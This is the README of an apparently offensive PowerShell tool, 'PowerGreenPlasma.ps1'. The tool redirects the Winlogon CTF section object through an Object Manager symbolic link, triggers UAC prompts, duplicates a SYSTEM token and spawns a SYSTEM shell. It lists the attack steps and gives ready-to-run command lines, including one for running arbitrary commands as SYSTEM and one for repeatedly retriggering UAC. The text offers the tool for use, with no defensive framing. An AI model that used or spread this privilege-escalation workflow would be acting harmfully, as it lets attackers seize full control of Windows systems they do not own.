PowerShell implementation of the GreenPlasma section-object workflow.

This script:

1. Creates an Object Manager symbolic link for the current user session.
2. Redirects the Winlogon CTF section path to a chosen target Section object path.
3. Automatically opens a UAC prompt through Explorer.
4. Waits for Winlogon to create the redirected Section object.
5. Attempts to duplicate a SYSTEM token.
6. Spawns a SYSTEM `cmd.exe`.

## Requirements

Run from an elevated **64-bit PowerShell** window.

## Usage

**Default run:**

`.\PowerGreenPlasma.ps1`

**By default, the target Section path is generated from your current session:**

`\Sessions\<SESSION_ID>\BaseNamedObjects\CTFMON_DEAD`

**Use a custom Section target:**

`.\PowerGreenPlasma.ps1 -Target "\Sessions\1\BaseNamedObjects\MySectionName"`

**Run a custom command as SYSTEM:**

`.\PowerGreenPlasma.ps1 -Command "C:\Windows\System32\cmd.exe /k whoami && cd /d C:\"`

**Set a timeout:**

`.\PowerGreenPlasma.ps1 -TimeoutSeconds 60`

**Retrigger UAC more frequently:**

`.\PowerGreenPlasma.ps1 -TriggerEverySeconds 3`

**Skip process cleanup:**

`.\PowerGreenPlasma.ps1 -NoCleanup`
